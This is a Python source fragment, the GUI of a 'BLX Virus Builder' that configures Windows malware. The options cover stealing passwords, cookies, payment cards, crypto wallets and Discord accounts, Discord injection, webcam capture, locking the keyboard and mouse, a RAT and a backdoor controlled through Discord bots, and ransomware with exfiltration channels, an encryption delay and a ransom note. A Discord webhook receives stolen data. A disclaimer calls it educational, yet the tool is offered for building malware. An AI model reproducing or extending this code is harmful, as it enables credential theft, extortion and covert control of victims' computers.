    def _safe_destroy():
        _cancel_all_after()
        try:
            builder.quit()
        except Exception:
            pass
        try:
            _devnull = open(os.devnull, 'w')
            _old_stderr = sys.stderr
            sys.stderr = _devnull
            try:
                builder.destroy()
            finally:
                sys.stderr = _old_stderr
                _devnull.close()
        except Exception:
            pass

    def ClosingWindow():
        global exit_window
        exit_window = True
        _safe_destroy()

    def ClosingBuild():
        _safe_destroy()

    builder = ctk.CTk()
    builder.title(f"BLX {version_tool} - Virus Builder")
    builder.geometry("800x750")
    builder.resizable(False, False)
    builder.configure(fg_color=colors["background"])
    builder.iconbitmap(os.path.join(tool_path, "Img", "BLX_icon.ico"))

    def OpenSponsorLinks():
        try:
            for url in ["https://guns.lol/benzoxdev", "https://www.instagram.com/just._.amar_x1", "https://github.com/BenzoXdev"]:
                webbrowser.open(url, new=1)
        except Exception:
            pass

    builder.after(300, OpenSponsorLinks)

    option_system                    = "Disable"
    option_game_launchers            = "Disable"
    option_wallets                   = "Disable"
    option_apps                      = "Disable"
    option_discord                   = "Disable"
    option_discord_injection         = "Disable"
    option_passwords                 = "Disable"
    option_cookies                   = "Disable"
    option_history                   = "Disable"
    option_downloads                 = "Disable"
    option_cards                     = "Disable"
    option_extentions                = "Disable"
    option_interesting_files         = "Disable"
    option_roblox                    = "Disable"
    option_webcam                    = "Disable"
    option_screenshot                = "Disable"

    option_block_key                 = "Disable"
    option_block_mouse               = "Disable"
    option_block_task_manager        = "Disable"
    option_block_website             = "Disable"
    option_shutdown                  = "Disable"
    option_spam_open_programs        = "Disable"
    option_spam_create_files         = "Disable"
    option_message_popup            = "Disable"
    option_startup                   = "Disable"
    option_restart                   = "Disable"
    option_anti_vm_and_debug         = "Disable"
    option_rat                       = "Disable"
    option_backdoor                  = "Disable"
    option_ransomware                = "Disable"
    rat_bot_token                    = ""
    rat_server_id                    = ""
    rat_persistence                  = "Disable"
    rat_admin_required               = "Disable"
    backdoor_bot_token               = ""
    backdoor_server_id               = ""
    backdoor_persistence             = "Disable"
    backdoor_admin_required          = "Disable"
    ransomware_bot_token             = ""
    ransomware_server_id            = ""
    ransomware_webhook_url           = ""
    ransomware_exfil_token           = ""
    ransomware_exfil_channel_id     = ""
    ransomware_excluded_ext          = ""
    ransomware_excluded_paths        = ""
    ransomware_readme_text           = ""
    ransomware_delay_sec             = "0"
    _rat_config_window               = None
    _backdoor_config_window          = None
    _ransomware_config_window        = None
    webhook                          = "None"
    name_file                        = "None"
    icon_path                        = "None"
    file_type                        = "None"

    option_system_var                    = ctk.StringVar(value="Disable")
    option_game_launchers_var            = ctk.StringVar(value="Disable")
    option_wallets_var                   = ctk.StringVar(value="Disable")
    option_apps_var                      = ctk.StringVar(value="Disable")
    option_roblox_var                    = ctk.StringVar(value="Disable")
    option_discord_var                   = ctk.StringVar(value="Disable")
    option_discord_injection_var         = ctk.StringVar(value="Disable")
    option_passwords_var                 = ctk.StringVar(value="Disable")
    option_cookies_var                   = ctk.StringVar(value="Disable")
    option_history_var                   = ctk.StringVar(value="Disable")
    option_downloads_var                 = ctk.StringVar(value="Disable")
    option_cards_var                     = ctk.StringVar(value="Disable")
    option_extentions_var                = ctk.StringVar(value="Disable")
    option_interesting_files_var         = ctk.StringVar(value="Disable")
    option_webcam_var                    = ctk.StringVar(value="Disable")
    option_screenshot_var                = ctk.StringVar(value="Disable")
    option_block_key_var                 = ctk.StringVar(value="Disable")
    option_block_mouse_var               = ctk.StringVar(value="Disable")
    option_block_task_manager_var        = ctk.StringVar(value="Disable")
    option_block_website_var             = ctk.StringVar(value="Disable")
    option_shutdown_var                  = ctk.StringVar(value="Disable")
    option_spam_open_programs_var        = ctk.StringVar(value="Disable")
    option_spam_create_files_var         = ctk.StringVar(value="Disable")
    option_message_popup_var            = ctk.StringVar(value="Disable")
    option_startup_var                   = ctk.StringVar(value="Disable")
    option_restart_var                   = ctk.StringVar(value="Disable")
    option_anti_vm_and_debug_var         = ctk.StringVar(value="Disable")
    option_rat_var                       = ctk.StringVar(value="Disable")
    option_backdoor_var                  = ctk.StringVar(value="Disable")
    option_ransomware_var                = ctk.StringVar(value="Disable")
    file_type_var                        = ctk.StringVar(value="File Type")
    webhook_var                          = ctk.StringVar(value="None")

    def ErrorLogs(message):
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {message + white}")
        messagebox.showerror(f"BLX {version_tool} - Virus Builder", message)

    def InfoLogs(message):
        messagebox.showinfo(f"BLX {version_tool} - Virus Builder", message)

    def TestWebhook():
        webhook = webhook_url.get()
        if CheckWebhook(webhook) == True:
            try:
                embed = {
                    'title': '✅ Webhook Validation',
                    'description': 'Le webhook a été validé avec succès !',
                    'color': 0x00ff00,
                    'footer': {
                        'text': 'BLX | benzoXdev',
                        'icon_url': 'https://avatars.githubusercontent.com/u/210432555?s=400&u=34330c3f5ce30c15197ac99efbe1d10f3b711278&v=4'
                    }
                }
                payload = {
                    'embeds': [embed],
                    'username': 'BLX | benzoXdev',
                    'avatar_url': 'https://zupimages.net/up/26/05/ip7u.png'
                }
                requests.post(webhook, json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
                InfoLogs("The webhook is valid. Validation message sent!")
            except Exception:
                InfoLogs("The webhook is valid.")
        else:
            ErrorLogs("The webhook is invalid.")

    Slow(virus_banner)
    
    title_frame = ctk.CTkFrame(builder, width=780, height=198, fg_color=colors["background"]) 
    title_frame.grid(row=1, column=0, sticky="w", pady=(10, 0), padx=(10, 0))
    title_frame.grid_propagate(False)
    title_frame.grid_columnconfigure(0, weight=1)

    title = ctk.CTkLabel(title_frame, text="Virus Builder", font=ctk.CTkFont(family="Helvetica", size=40, weight="bold"), text_color=colors["red"])
    title.grid(row=1, pady=(10, 0), sticky="we", columnspan=3)

    text = ctk.CTkLabel(title_frame, text="The builder only creates viruses that work under Windows.", font=ctk.CTkFont(family="Helvetica", size=13), text_color=colors["red"])
    text.grid(row=2, pady=0, columnspan=3, sticky="we")

    disclaimer_label = ctk.CTkLabel(title_frame, text="Usage \u00e9ducatif / recherche cybers\u00e9curit\u00e9 uniquement. L'auteur d\u00e9cline toute responsabilit\u00e9 quant \u00e0 l'usage fait de cet outil.", font=ctk.CTkFont(family="Helvetica", size=10), text_color=colors["dark_gray"])
    disclaimer_label.grid(row=3, pady=(2, 0), columnspan=3, sticky="we")

    url_display = github_tool.replace("https://", "").replace("http://", "")
    url = ctk.CTkLabel(title_frame, text=url_display, font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'], cursor="hand2")
    url.grid(row=4, pady=(3, 10), columnspan=3, sticky="we")
    url.bind("<Button-1>", lambda e: webbrowser.open(github_tool))

    webhook_url = ctk.CTkEntry(title_frame, height=45, width=350, corner_radius=5, font=ctk.CTkFont(family="Helvetica", size=15), justify="center", border_color=colors["red"], fg_color=colors["dark_gray"], border_width=2, placeholder_text="https://discord.com/api/webhooks/...", text_color=colors['white'])
    webhook_url.grid(row=4, column=0, padx=(150, 5), pady=10, sticky="we")

    test_webhook = ctk.CTkButton(title_frame, text="Test Webhook", command=TestWebhook, height=45, corner_radius=5, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14))
    test_webhook.grid(row=4, column=1, padx=(5, 150), pady=10, sticky="we")

    options_stealer_frame = ctk.CTkFrame(builder, width=720, height=209, fg_color=colors["dark_gray"]) 
    options_stealer_frame.grid(row=2, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    options_stealer_frame.grid_propagate(False)
    options_stealer_frame.grid_columnconfigure(0, weight=1)
    options_stealer_frame.grid_columnconfigure(1, weight=1)
    options_stealer_frame.grid_columnconfigure(2, weight=1)

    options_malware_frame = ctk.CTkFrame(builder, width=720, height=180, fg_color=colors["dark_gray"]) 
    options_malware_frame.grid(row=3, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    options_malware_frame.grid_propagate(False)
    options_malware_frame.grid_columnconfigure(0, weight=1)
    options_malware_frame.grid_columnconfigure(1, weight=1)
    options_malware_frame.grid_columnconfigure(2, weight=1)

    def ChooseIcon():
        global icon_path
        try:
            if sys.platform.startswith("win"):
                root = tkinter.Tk()
                root.iconbitmap(os.path.join(tool_path, "Img", "BLX_icon.ico"))
                root.withdraw()
                root.attributes('-topmost', True)
                icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
            elif sys.platform.startswith("linux"):
                icon_path = filedialog.askopenfilename(title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
        except:
            pass
        
    popup_title         = "Microsoft Excel"
    popup_message       = "The file is corrupt and cannot be opened."
    popup_type          = "error"
    message_popup_window_status = True

    def CreateMessagePopupWindow():
        global message_popup_window_status
        if message_popup_window_status:
            message_popup_window_status = False
            pass
        else:
            message_popup_window_status = True
            return

        message_popup_window = ctk.CTkToplevel(builder)
        message_popup_window.title(f"BLX {version_tool} - Message Popup")
        message_popup_window.geometry("320x320")
        message_popup_window.resizable(False, False)
        message_popup_window.configure(fg_color=colors["background"])

        popup_type_options = ["ℹ️ Information", "⚠️ Avertissement", "❌ Erreur", "❓ Question"]
        popup_type_var = ctk.StringVar(value="❌ Erreur")
        popup_type_menu = ctk.CTkOptionMenu(message_popup_window, values=popup_type_options, variable=popup_type_var, fg_color=colors["dark_gray"], button_color=colors["red"], button_hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=260)
        popup_type_menu.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="ew")

        popup_title_entry = ctk.CTkEntry(message_popup_window, justify="center", placeholder_text="Titre", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=260)
        popup_title_entry.grid(row=1, column=0, padx=20, pady=10, sticky="ew")

        popup_message_entry = ctk.CTkEntry(message_popup_window, justify="center", placeholder_text="Message", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=260)
        popup_message_entry.grid(row=2, column=0, padx=20, pady=(10, 20), sticky="ew")

        def Validate():
            global popup_title, popup_message, popup_type
            popup_title = popup_title_entry.get() or "Titre"
            popup_message = popup_message_entry.get() or "Message"
            choice = popup_type_var.get()
            if "Information" in choice: popup_type = "info"
            elif "Avertissement" in choice: popup_type = "warning"
            elif "Erreur" in choice: popup_type = "error"
            else: popup_type = "question"
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Message Popup Type    : {white + popup_type}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Message Popup Title   : {white + popup_title}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Message Popup Message : {white + popup_message}")
            message_popup_window.destroy()

        validate_button = ctk.CTkButton(message_popup_window, text="Valider", command=Validate, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14), height=40, width=100)
        validate_button.grid(row=3, column=0, padx=20, pady=10, sticky="ew")

    def CreateRatWindow():
        if option_rat_var.get() != "Enable":
            return
        option_backdoor_var.set("Disable")
        global rat_bot_token, rat_server_id, rat_persistence, rat_admin_required, _rat_config_window, _backdoor_config_window
        if _backdoor_config_window is not None:
            try:
                if _backdoor_config_window.winfo_exists():
                    _backdoor_config_window.destroy()
            except Exception:
                pass
            _backdoor_config_window = None
        rat_window = ctk.CTkToplevel(builder)
        _rat_config_window = rat_window
        rat_window.title(f"BLX {version_tool} - RAT Config")
        rat_window.geometry("340x320")
        rat_window.resizable(False, False)
        rat_window.configure(fg_color=colors["background"])
        ctk.CTkLabel(rat_window, text="Bot Token", font=ctk.CTkFont(family="Helvetica", size=12), text_color=colors["white"]).grid(row=0, column=0, padx=20, pady=(20, 2), sticky="w")
        rat_bot_token_entry = ctk.CTkEntry(rat_window, justify="center", placeholder_text="Discord Bot Token", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=12), height=36, width=280, show="*")
        rat_bot_token_entry.grid(row=1, column=0, padx=20, pady=(0, 10), sticky="ew")
        ctk.CTkLabel(rat_window, text="Server ID", font=ctk.CTkFont(family="Helvetica", size=12), text_color=colors["white"]).grid(row=2, column=0, padx=20, pady=(0, 2), sticky="w")
        rat_server_id_entry = ctk.CTkEntry(rat_window, justify="center", placeholder_text="Discord Server ID", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=12), height=36, width=280)
        rat_server_id_entry.grid(row=3, column=0, padx=20, pady=(0, 14), sticky="ew")
        rat_persistence_var = ctk.StringVar(value=rat_persistence)
        rat_admin_var = ctk.StringVar(value=rat_admin_required)
        rat_persist_cb = ctk.CTkCheckBox(rat_window, text="Persistence (enable)", variable=rat_persistence_var, onvalue="Enable", offvalue="Disable", fg_color=colors["red"], hover_color=colors["dark_red"], border_color=colors["red"], font=ctk.CTkFont(size=12), text_color=colors["white"])
        rat_persist_cb.grid(row=4, column=0, padx=20, pady=4, sticky="w")
        rat_admin_cb = ctk.CTkCheckBox(rat_window, text="Admin required (spam until accept)", variable=rat_admin_var, onvalue="Enable", offvalue="Disable", fg_color=colors["red"], hover_color=colors["dark_red"], border_color=colors["red"], font=ctk.CTkFont(size=12), text_color=colors["white"])
        rat_admin_cb.grid(row=5, column=0, padx=20, pady=4, sticky="w")
        def ValidateRat():
            global rat_bot_token, rat_server_id, rat_persistence, rat_admin_required, _rat_config_window
            rat_bot_token = rat_bot_token_entry.get().strip()
            rat_server_id = rat_server_id_entry.get().strip()
            rat_persistence = rat_persistence_var.get()
            rat_admin_required = rat_admin_var.get()
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} RAT Bot Token  : {white + (rat_bot_token[:20] + '...' if len(rat_bot_token) > 20 else rat_bot_token or '(empty)')}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} RAT Server ID  : {white + (rat_server_id or '(empty)')}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} RAT Persistence: {white + rat_persistence} | Admin required: {white + rat_admin_required}")
            rat_window.destroy()
            _rat_config_window = None
        ctk.CTkButton(rat_window, text="Validate", command=ValidateRat, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(size=14), height=38, width=100).grid(row=6, column=0, padx=20, pady=20, sticky="ew")

    def CreateBackdoorWindow():
        if option_backdoor_var.get() != "Enable":
            return
        option_rat_var.set("Disable")
        global backdoor_bot_token, backdoor_server_id, backdoor_persistence, backdoor_admin_required, _rat_config_window, _backdoor_config_window
        if _rat_config_window is not None:
            try:
                if _rat_config_window.winfo_exists():
                    _rat_config_window.destroy()
            except Exception:
                pass
            _rat_config_window = None
        backdoor_window = ctk.CTkToplevel(builder)
        _backdoor_config_window = backdoor_window
        backdoor_window.title(f"BLX {version_tool} - Backdoor Config")
        backdoor_window.geometry("340x320")
        backdoor_window.resizable(False, False)
        backdoor_window.configure(fg_color=colors["background"])
        ctk.CTkLabel(backdoor_window, text="Bot Token", font=ctk.CTkFont(family="Helvetica", size=12), text_color=colors["white"]).grid(row=0, column=0, padx=20, pady=(20, 2), sticky="w")
        backdoor_bot_token_entry = ctk.CTkEntry(backdoor_window, justify="center", placeholder_text="Discord Bot Token", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=12), height=36, width=280, show="*")
        backdoor_bot_token_entry.grid(row=1, column=0, padx=20, pady=(0, 10), sticky="ew")
        ctk.CTkLabel(backdoor_window, text="Server ID", font=ctk.CTkFont(family="Helvetica", size=12), text_color=colors["white"]).grid(row=2, column=0, padx=20, pady=(0, 2), sticky="w")
        backdoor_server_id_entry = ctk.CTkEntry(backdoor_window, justify="center", placeholder_text="Discord Server ID", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=12), height=36, width=280)
        backdoor_server_id_entry.grid(row=3, column=0, padx=20, pady=(0, 14), sticky="ew")
        backdoor_persistence_var = ctk.StringVar(value=backdoor_persistence)
        backdoor_admin_var = ctk.StringVar(value=backdoor_admin_required)
        backdoor_persist_cb = ctk.CTkCheckBox(backdoor_window, text="Persistence (enable)", variable=backdoor_persistence_var, onvalue="Enable", offvalue="Disable", fg_color=colors["red"], hover_color=colors["dark_red"], border_color=colors["red"], font=ctk.CTkFont(size=12), text_color=colors["white"])
        backdoor_persist_cb.grid(row=4, column=0, padx=20, pady=4, sticky="w")
        backdoor_admin_cb = ctk.CTkCheckBox(backdoor_window, text="Admin required (spam until accept)", variable=backdoor_admin_var, onvalue="Enable", offvalue="Disable", fg_color=colors["red"], hover_color=colors["dark_red"], border_color=colors["red"], font=ctk.CTkFont(size=12), text_color=colors["white"])
        backdoor_admin_cb.grid(row=5, column=0, padx=20, pady=4, sticky="w")
        def ValidateBackdoor():
            global backdoor_bot_token, backdoor_server_id, backdoor_persistence, backdoor_admin_required, _backdoor_config_window
            backdoor_bot_token = backdoor_bot_token_entry.get().strip()
            backdoor_server_id = backdoor_server_id_entry.get().strip()
            backdoor_persistence = backdoor_persistence_var.get()
            backdoor_admin_required = backdoor_admin_var.get()
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Backdoor Bot Token  : {white + (backdoor_bot_token[:20] + '...' if len(backdoor_bot_token) > 20 else backdoor_bot_token or '(empty)')}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Backdoor Server ID  : {white + (backdoor_server_id or '(empty)')}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Backdoor Persistence: {white + backdoor_persistence} | Admin required: {white + backdoor_admin_required}")
            backdoor_window.destroy()
            _backdoor_config_window = None
        ctk.CTkButton(backdoor_window, text="Validate", command=ValidateBackdoor, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(size=14), height=38, width=100).grid(row=6, column=0, padx=20, pady=20, sticky="ew")

    def CreateRansomwareWindow():
        if option_ransomware_var.get() != "Enable":
            return
        global ransomware_bot_token, ransomware_server_id, ransomware_webhook_url, _ransomware_config_window
        global ransomware_excluded_ext, ransomware_excluded_paths, ransomware_readme_text, ransomware_delay_sec
        if _ransomware_config_window is not None:
            try:
                if _ransomware_config_window.winfo_exists():
                    _ransomware_config_window.destroy()
            except Exception:
                pass
            _ransomware_config_window = None
        rw_window = ctk.CTkToplevel(builder)
        _ransomware_config_window = rw_window
        rw_window.title(f"BLX {version_tool} - Ransomware Config")
        rw_window.geometry("360x620")
        rw_window.resizable(True, True)
        rw_window.configure(fg_color=colors["background"])
        def OpenRansomwareFolder():
            try:
                rw_dir = os.path.join(tool_path, "Ransomware")
                if os.path.isdir(rw_dir):
                    os.startfile(rw_dir)
                else:
                    InfoLogs("Ransomware folder not found.")
            except Exception as e:
                ErrorLogs(str(e))
        ctk.CTkButton(rw_window, text="Ouvrir dossier Ransomware", command=OpenRansomwareFolder, fg_color=colors["dark_gray"], hover_color=colors["red"], font=ctk.CTkFont(size=12), height=32).grid(row=0, column=0, padx=20, pady=(12, 8), sticky="ew")
        ctk.CTkLabel(rw_window, text="Bot Token", font=ctk.CTkFont(family="Helvetica", size=12), text_color=colors["white"]).grid(row=1, column=0, padx=20, pady=(0, 2), sticky="w")
        rw_bot_token_entry = ctk.CTkEntry(rw_window, justify="center", placeholder_text="Discord Bot Token (for !key command)", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=12), height=36, width=320, show="*")
        rw_bot_token_entry.grid(row=2, column=0, padx=20, pady=(0, 6), sticky="ew")
        ctk.CTkLabel(rw_window, text="Server ID", font=ctk.CTkFont(family="Helvetica", size=12), text_color=colors["white"]).grid(row=3, column=0, padx=20, pady=(0, 2), sticky="w")
        rw_server_id_entry = ctk.CTkEntry(rw_window, justify="center", placeholder_text="Discord Server ID", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=12), height=36, width=320)
        rw_server_id_entry.grid(row=4, column=0, padx=20, pady=(0, 6), sticky="ew")
        ctk.CTkLabel(rw_window, text="Webhook URL (victim reports)", font=ctk.CTkFont(family="Helvetica", size=12), text_color=colors["white"]).grid(row=5, column=0, padx=20, pady=(0, 2), sticky="w")
        rw_webhook_entry = ctk.CTkEntry(rw_window, justify="center", placeholder_text="Same as main or paste URL", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=12), height=36, width=320)
        rw_webhook_entry.grid(row=6, column=0, padx=20, pady=(0, 6), sticky="ew")
        ctk.CTkLabel(rw_window, text="Exfil Bot Token (victim listener, optional)", font=ctk.CTkFont(family="Helvetica", size=12), text_color=colors["white"]).grid(row=7, column=0, padx=20, pady=(0, 2), sticky="w")
        rw_exfil_token_entry = ctk.CTkEntry(rw_window, justify="center", placeholder_text="Second bot token for !exfil", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=12), height=36, width=320, show="*")
        rw_exfil_token_entry.grid(row=8, column=0, padx=20, pady=(0, 6), sticky="ew")
        ctk.CTkLabel(rw_window, text="Exfil Channel ID (optional)", font=ctk.CTkFont(family="Helvetica", size=12), text_color=colors["white"]).grid(row=9, column=0, padx=20, pady=(0, 2), sticky="w")
        rw_exfil_channel_entry = ctk.CTkEntry(rw_window, justify="center", placeholder_text="Channel where !exfil commands are sent", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=12), height=36, width=320)
        rw_exfil_channel_entry.grid(row=10, column=0, padx=20, pady=(0, 6), sticky="ew")
        ctk.CTkLabel(rw_window, text="Extensions exclues (virgule, ex: .exe,.dll)", font=ctk.CTkFont(family="Helvetica", size=11), text_color=colors["white"]).grid(row=11, column=0, padx=20, pady=(8, 2), sticky="w")
        rw_excluded_ext_entry = ctk.CTkEntry(rw_window, justify="center", placeholder_text=".exe,.dll,.sys (vide = aucune)", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=11), height=32, width=320)
        rw_excluded_ext_entry.grid(row=12, column=0, padx=20, pady=(0, 4), sticky="ew")
        ctk.CTkLabel(rw_window, text="Chemins exclus (virgule, ex: C:\\Users\\Public)", font=ctk.CTkFont(family="Helvetica", size=11), text_color=colors["white"]).grid(row=13, column=0, padx=20, pady=(4, 2), sticky="w")
        rw_excluded_paths_entry = ctk.CTkEntry(rw_window, justify="center", placeholder_text="Vide = aucun", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=11), height=32, width=320)
        rw_excluded_paths_entry.grid(row=14, column=0, padx=20, pady=(0, 4), sticky="ew")
        ctk.CTkLabel(rw_window, text="Texte README (optionnel, remplace le message sur le Bureau)", font=ctk.CTkFont(family="Helvetica", size=11), text_color=colors["white"]).grid(row=15, column=0, padx=20, pady=(4, 2), sticky="w")
        rw_readme_textbox = ctk.CTkTextbox(rw_window, height=56, width=320, font=ctk.CTkFont(size=11), fg_color=colors["dark_gray"], border_color=colors["red"])
        rw_readme_textbox.grid(row=16, column=0, padx=20, pady=(0, 4), sticky="ew")
        ctk.CTkLabel(rw_window, text="Délai avant chiffrement (secondes, 0 = immédiat)", font=ctk.CTkFont(family="Helvetica", size=11), text_color=colors["white"]).grid(row=17, column=0, padx=20, pady=(4, 2), sticky="w")
        rw_delay_entry = ctk.CTkEntry(rw_window, justify="center", placeholder_text="0", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(size=11), height=32, width=120)
        rw_delay_entry.grid(row=18, column=0, padx=20, pady=(0, 12), sticky="w")
        if ransomware_bot_token:
            rw_bot_token_entry.insert(0, ransomware_bot_token)
        if ransomware_server_id:
            rw_server_id_entry.insert(0, ransomware_server_id)
        if ransomware_webhook_url:
            rw_webhook_entry.insert(0, ransomware_webhook_url)
        if ransomware_exfil_token:
            rw_exfil_token_entry.insert(0, ransomware_exfil_token)
        if ransomware_exfil_channel_id:
            rw_exfil_channel_entry.insert(0, ransomware_exfil_channel_id)
        if ransomware_excluded_ext:
            rw_excluded_ext_entry.insert(0, ransomware_excluded_ext)
        if ransomware_excluded_paths:
            rw_excluded_paths_entry.insert(0, ransomware_excluded_paths)
        if ransomware_readme_text:
            rw_readme_textbox.insert("1.0", ransomware_readme_text)
        if ransomware_delay_sec:
            rw_delay_entry.insert(0, ransomware_delay_sec)
        def ValidateRansomware():
            global ransomware_bot_token, ransomware_server_id, ransomware_webhook_url, ransomware_exfil_token, ransomware_exfil_channel_id, _ransomware_config_window
            global ransomware_excluded_ext, ransomware_excluded_paths, ransomware_readme_text, ransomware_delay_sec
            ransomware_bot_token = rw_bot_token_entry.get().strip()
            ransomware_server_id = rw_server_id_entry.get().strip()
            ransomware_webhook_url = rw_webhook_entry.get().strip()
            ransomware_exfil_token = rw_exfil_token_entry.get().strip()
            ransomware_exfil_channel_id = rw_exfil_channel_entry.get().strip()
            ransomware_excluded_ext = rw_excluded_ext_entry.get().strip()
            ransomware_excluded_paths = rw_excluded_paths_entry.get().strip()
            ransomware_readme_text = rw_readme_textbox.get("1.0", "end").strip()
            try:
                d = rw_delay_entry.get().strip()
                ransomware_delay_sec = str(max(0, min(86400, int(d)))) if d else "0"
            except Exception:
                ransomware_delay_sec = "0"
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Ransomware Bot Token : {white + (ransomware_bot_token[:20] + '...' if len(ransomware_bot_token) > 20 else ransomware_bot_token or '(empty)')}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Ransomware Server ID  : {white + (ransomware_server_id or '(empty)')}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Ransomware Webhook    : {white + (ransomware_webhook_url[:50] + '...' if len(ransomware_webhook_url) > 50 else ransomware_webhook_url or '(main)')}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Ransomware Exfil Channel: {white + (ransomware_exfil_channel_id or '(empty)')}")
            rw_window.destroy()
            _ransomware_config_window = None
        ctk.CTkButton(rw_window, text="Validate", command=ValidateRansomware, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(size=14), height=38, width=100).grid(row=19, column=0, padx=20, pady=16, sticky="ew")

    option_system_cb                    = ctk.CTkCheckBox(options_stealer_frame, text="System Info",            variable=option_system_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_wallets_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Wallets Session Files",  variable=option_wallets_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_game_launchers_cb            = ctk.CTkCheckBox(options_stealer_frame, text="Games Session Files",    variable=option_game_launchers_var,            onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_apps_cb                      = ctk.CTkCheckBox(options_stealer_frame, text="Telegram Session Files", variable=option_apps_var,                      onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_roblox_cb                    = ctk.CTkCheckBox(options_stealer_frame, text="Roblox Accounts",        variable=option_roblox_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_discord_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Discord Accounts",       variable=option_discord_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_discord_injection_cb         = ctk.CTkCheckBox(options_stealer_frame, text="Discord Injection",      variable=option_discord_injection_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_passwords_cb                 = ctk.CTkCheckBox(options_stealer_frame, text="Passwords",              variable=option_passwords_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_cookies_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Cookies",                variable=option_cookies_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_history_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Browsing History",       variable=option_history_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_downloads_cb                 = ctk.CTkCheckBox(options_stealer_frame, text="Download History",       variable=option_downloads_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_cards_cb                     = ctk.CTkCheckBox(options_stealer_frame, text="Cards",                  variable=option_cards_var,                     onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_extentions_cb                = ctk.CTkCheckBox(options_stealer_frame, text="Extentions",             variable=option_extentions_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
